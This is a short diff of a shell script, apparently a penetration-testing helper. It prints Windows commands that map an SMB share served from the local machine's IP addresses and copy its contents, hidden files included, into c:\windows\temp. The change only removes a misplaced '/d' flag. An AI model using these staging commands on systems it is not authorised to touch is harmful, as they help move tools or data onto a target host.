@@ -35,7 +35,7 @@ echo " "
 	echo "[------------------------------------------------------------------------------------------------]"
 	echo "                                      MAP DRIVES USING                                            "
 		ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | while read ip ; do
-   			echo  net use x: /d \\\\$ip\\SMB
+   			echo  net use x: \\\\$ip\\SMB
 		done
 	echo "                                    MOVE CONTENTS TO TMP                                         "
 	echo "xcopy x:\ c:\windows\temp /h/i/c/k/e/r/y                                                         "
